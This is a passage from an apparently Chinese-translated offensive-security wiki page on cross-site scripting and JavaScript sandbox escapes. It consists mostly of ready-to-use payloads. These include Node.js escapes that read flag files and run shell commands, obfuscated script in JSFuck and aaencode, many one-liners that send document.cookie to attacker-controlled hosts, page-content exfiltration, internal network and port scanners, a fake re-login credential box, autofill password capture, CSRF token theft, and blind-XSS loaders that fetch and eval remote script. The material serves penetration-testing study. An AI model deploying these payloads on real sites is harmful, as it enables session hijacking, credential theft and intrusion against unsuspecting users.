eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
</code></pre>
<p>如果在执行不可信代码之前<strong>一切都是未定义的</strong>（就像在<a href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves"><strong>这篇文章</strong></a>中），可以“凭空”生成有用的对象，以滥用任意不可信代码的执行：</p>
<ul>
<li>使用 import()</li>
</ul>
<pre><code class="language-javascript">// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=&gt;console.log(m.readFileSync("/flag.txt", "utf8")))
</code></pre>
<ul>
<li>间接访问 <code>require</code></li>
</ul>
<p><a href="https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050">根据这个</a> 模块在 Node.js 中被包装在一个函数内，如下所示：</p>
<pre><code class="language-javascript">(function (exports, require, module, __filename, __dirname) {
// our actual module code
});
</code></pre>
<p>因此，如果我们可以从该模块<strong>调用另一个函数</strong>，则可以从该函数使用 <code>arguments.callee.caller.arguments[1]</code> 来访问 <strong><code>require</code></strong>：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
</code></pre>
<p>{% endcode %}</p>
<p>以与前一个示例类似的方式，可以<strong>使用错误处理程序</strong>访问模块的<strong>包装器</strong>并获取**<code>require</code>**函数：</p>
<pre><code class="language-javascript">try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =&gt; structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log('='.repeat(40))
if ((args = fn?.arguments)?.length &gt; 0) {
req = args[1]
console.log(req('child_process').execSync('id').toString())
}
}
}
trigger()
</code></pre>
<h3 id="混淆与高级绕过"><a class="header" href="#混淆与高级绕过">混淆与高级绕过</a></h3>
<ul>
<li><strong>一个页面中的不同混淆：</strong> <a href="https://aem1k.com/aurebesh.js/"><strong>https://aem1k.com/aurebesh.js/</strong></a></li>
<li><a href="https://github.com/aemkei/katakana.js">https://github.com/aemkei/katakana.js</a></li>
<li><a href="https://ooze.ninja/javascript/poisonjs">https://ooze.ninja/javascript/poisonjs</a></li>
<li><a href="https://javascriptobfuscator.herokuapp.com">https://javascriptobfuscator.herokuapp.com/</a></li>
<li><a href="https://skalman.github.io/UglifyJS-online/">https://skalman.github.io/UglifyJS-online/</a></li>
<li><a href="http://www.jsfuck.com">http://www.jsfuck.com/</a></li>
<li>更复杂的 JSFuck: <a href="https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce">https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce</a></li>
<li><a href="http://utf-8.jp/public/jjencode.html">http://utf-8.jp/public/jjencode.html</a></li>
<li><a href="https://utf-8.jp/public/aaencode.html">https://utf-8.jp/public/aaencode.html</a></li>
<li><a href="https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses">https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses</a></li>
</ul>
<pre><code class="language-javascript">//Katana
&lt;script&gt;([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()&lt;/script&gt;
</code></pre>
<pre><code class="language-javascript">//JJencode
&lt;script&gt;$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();&lt;/script&gt;
</code></pre>
<pre><code class="language-javascript">//JSFuck
&lt;script&gt;(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()&lt;/script&gt;
</code></pre>
<pre><code class="language-javascript">//aaencode
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
</code></pre>
<pre><code class="language-javascript">// It's also possible to execute JS code only with the chars: []`+!${}
</code></pre>
<h2 id="xss-常见有效载荷"><a class="header" href="#xss-常见有效载荷">XSS 常见有效载荷</a></h2>
<h3 id="多个有效载荷在-1-中"><a class="header" href="#多个有效载荷在-1-中">多个有效载荷在 1 中</a></h3>
<p>{% content-ref url="steal-info-js.md" %}
<a href="steal-info-js.html">steal-info-js.md</a>
{% endcontent-ref %}</p>
<h3 id="iframe-陷阱"><a class="header" href="#iframe-陷阱">Iframe 陷阱</a></h3>
<p>使用户在页面中导航而不退出 iframe，并窃取其操作（包括在表单中发送的信息）：</p>
<p>{% content-ref url="../iframe-traps.md" %}
<a href="../iframe-traps.html">iframe-traps.md</a>
{% endcontent-ref %}</p>
<h3 id="检索-cookies"><a class="header" href="#检索-cookies">检索 Cookies</a></h3>
<pre><code class="language-javascript">&lt;img src=x onerror=this.src="http://&lt;YOUR_SERVER_IP&gt;/?c="+document.cookie&gt;
&lt;img src=x onerror="location.href='http://&lt;YOUR_SERVER_IP&gt;/?c='+ document.cookie"&gt;
&lt;script&gt;new Image().src="http://&lt;IP&gt;/?c="+encodeURI(document.cookie);&lt;/script&gt;
&lt;script&gt;new Audio().src="http://&lt;IP&gt;/?c="+escape(document.cookie);&lt;/script&gt;
&lt;script&gt;location.href = 'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='+document.cookie&lt;/script&gt;
&lt;script&gt;location = 'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='+document.cookie&lt;/script&gt;
&lt;script&gt;document.location = 'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='+document.cookie&lt;/script&gt;
&lt;script&gt;document.location.href = 'http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='+document.cookie&lt;/script&gt;
&lt;script&gt;document.write('&lt;img src="http://&lt;YOUR_SERVER_IP&gt;?c='+document.cookie+'" /&gt;')&lt;/script&gt;
&lt;script&gt;window.location.assign('http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='+document.cookie)&lt;/script&gt;
&lt;script&gt;window['location']['assign']('http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='+document.cookie)&lt;/script&gt;
&lt;script&gt;window['location']['href']('http://&lt;YOUR_SERVER_IP&gt;/Stealer.php?cookie='+document.cookie)&lt;/script&gt;
&lt;script&gt;document.location=["http://&lt;YOUR_SERVER_IP&gt;?c",document.cookie].join()&lt;/script&gt;
&lt;script&gt;var i=new Image();i.src="http://&lt;YOUR_SERVER_IP&gt;/?c="+document.cookie&lt;/script&gt;
&lt;script&gt;window.location="https://&lt;SERVER_IP&gt;/?c=".concat(document.cookie)&lt;/script&gt;
&lt;script&gt;var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://&lt;SERVER_IP&gt;/?c="%2Bdocument.cookie, true);xhttp.send();&lt;/script&gt;
&lt;script&gt;eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));&lt;/script&gt;
&lt;script&gt;fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});&lt;/script&gt;
&lt;script&gt;navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)&lt;/script&gt;
</code></pre>
<p>{% hint style="info" %}
如果在cookie中设置了HTTPOnly标志，您<strong>将无法通过JavaScript访问cookie</strong>。但在这里，如果您足够幸运，您可以<a href="../hacking-with-cookies/#httponly">绕过此保护的某些方法</a>。
{% endhint %}</p>
<h3 id="偷取页面内容"><a class="header" href="#偷取页面内容">偷取页面内容</a></h3>
<pre><code class="language-javascript">var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
</code></pre>
<h3 id="查找内部ip"><a class="header" href="#查找内部ip">查找内部IP</a></h3>
<pre><code class="language-html">&lt;script&gt;
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i&lt;=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i&lt;=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=&gt;r.text().then(text=&gt;
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&amp;code='+encodeURIComponent(text)+'&amp;'+Date.now()
}
))
.catch(e =&gt; {
if(!String(e).includes("The user aborted a request") &amp;&amp; q.length) {
q.shift()();
}
});

setTimeout(x=&gt;{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
&lt;/script&gt;
</code></pre>
<h3 id="端口扫描器-fetch"><a class="header" href="#端口扫描器-fetch">端口扫描器 (fetch)</a></h3>
<pre><code class="language-javascript">const checkPort = (port) =&gt; { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() =&gt; { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i&lt;1000; i++) { checkPort(i); }
</code></pre>
<h3 id="端口扫描器-websockets"><a class="header" href="#端口扫描器-websockets">端口扫描器 (websockets)</a></h3>
<pre><code class="language-python">var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i&lt;ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
</code></pre>
<p><em>Short times indicate a responding port</em> <em>Longer times indicate no response.</em></p>
<p>查看 Chrome 中禁止的端口列表 <a href="https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc"><strong>here</strong></a> 和 Firefox 中的 <a href="https://www-archive.mozilla.org/projects/netlib/portbanning#portlist"><strong>here</strong></a>。</p>
<h3 id="box-to-ask-for-credentials"><a class="header" href="#box-to-ask-for-credentials">Box to ask for credentials</a></h3>
<pre><code class="language-markup">&lt;style&gt;::placeholder { color:white; }&lt;/style&gt;&lt;script&gt;document.write("&lt;div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'&gt;&lt;form action='https://example.com/'&gt;&lt;p&gt;Your sesion has timed out, please login again:&lt;/p&gt;&lt;input style='width:100%;' type='text' placeholder='Username' /&gt;&lt;input style='width: 100%' type='password' placeholder='Password'/&gt;&lt;input type='submit' value='Login'&gt;&lt;/form&gt;&lt;p&gt;&lt;i&gt;This login box is presented using XSS as a proof-of-concept&lt;/i&gt;&lt;/p&gt;&lt;/div&gt;")&lt;/script&gt;
</code></pre>
<h3 id="自动填充密码捕获"><a class="header" href="#自动填充密码捕获">自动填充密码捕获</a></h3>
<pre><code class="language-javascript">&lt;b&gt;Username:&lt;/&gt;&lt;br&gt;
&lt;input name=username id=username&gt;
&lt;b&gt;Password:&lt;/&gt;&lt;br&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;
</code></pre>
<p>当任何数据被输入到密码字段时，用户名和密码会被发送到攻击者的服务器，即使客户端选择了一个保存的密码而没有输入任何内容，凭据仍然会被外泄。</p>
<h3 id="keylogger"><a class="header" href="#keylogger">Keylogger</a></h3>
<p>仅在github上搜索，我找到了几个不同的：</p>
<ul>
<li><a href="https://github.com/JohnHoder/Javascript-Keylogger">https://github.com/JohnHoder/Javascript-Keylogger</a></li>
<li><a href="https://github.com/rajeshmajumdar/keylogger">https://github.com/rajeshmajumdar/keylogger</a></li>
<li><a href="https://github.com/hakanonymos/JavascriptKeylogger">https://github.com/hakanonymos/JavascriptKeylogger</a></li>
<li>你也可以使用metasploit <code>http_javascript_keylogger</code></li>
</ul>
<h3 id="stealing-csrf-tokens"><a class="header" href="#stealing-csrf-tokens">Stealing CSRF tokens</a></h3>
<pre><code class="language-javascript">&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&amp;email=test@test.com')
};
&lt;/script&gt;
</code></pre>
<h3 id="偷窃-postmessage-消息"><a class="header" href="#偷窃-postmessage-消息">偷窃 PostMessage 消息</a></h3>
<pre><code class="language-markup">&lt;img src="https://attacker.com/?" id=message&gt;
&lt;script&gt;
window.onmessage = function(e){
document.getElementById("message").src += "&amp;"+e.data;
&lt;/script&gt;
</code></pre>
<h3 id="滥用服务工作者"><a class="header" href="#滥用服务工作者">滥用服务工作者</a></h3>
<p>{% content-ref url="abusing-service-workers.md" %}
<a href="abusing-service-workers.html">abusing-service-workers.md</a>
{% endcontent-ref %}</p>
<h3 id="访问影子dom"><a class="header" href="#访问影子dom">访问影子DOM</a></h3>
<p>{% content-ref url="shadow-dom.md" %}
<a href="shadow-dom.html">shadow-dom.md</a>
{% endcontent-ref %}</p>
<h3 id="多语言混合"><a class="header" href="#多语言混合">多语言混合</a></h3>
<p>{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}</p>
<h3 id="盲xss有效载荷"><a class="header" href="#盲xss有效载荷">盲XSS有效载荷</a></h3>
<p>您还可以使用: <a href="https://xsshunter.com">https://xsshunter.com/</a></p>
<pre><code class="language-markup">"&gt;&lt;img src='//domain/xss'&gt;
"&gt;&lt;script src="//domain/xss.js"&gt;&lt;/script&gt;
&gt;&lt;a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"&gt;Click Me For An Awesome Time&lt;/a&gt;
&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();&lt;/script&gt;

&lt;!-- html5sec - Self-executing focus event via autofocus: --&gt;
"&gt;&lt;input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus&gt;

&lt;!-- html5sec - JavaScript execution via iframe and onload --&gt;
"&gt;&lt;iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"&gt;

&lt;!-- html5sec - SVG tags allow code to be executed with onload without any other elements. --&gt;
"&gt;&lt;svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"&gt;&lt;/svg&gt;

&lt;!-- html5sec -  allow error handlers in &lt;SOURCE&gt; tags if encapsulated by a &lt;VIDEO&gt; tag. The same works for &lt;AUDIO&gt; tags  --&gt;
"&gt;&lt;video&gt;&lt;source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"&gt;

&lt;!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  --&gt;
"&gt;&lt;body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"&gt;

&lt;!-- xsshunter.com - Sites that use JQuery --&gt;
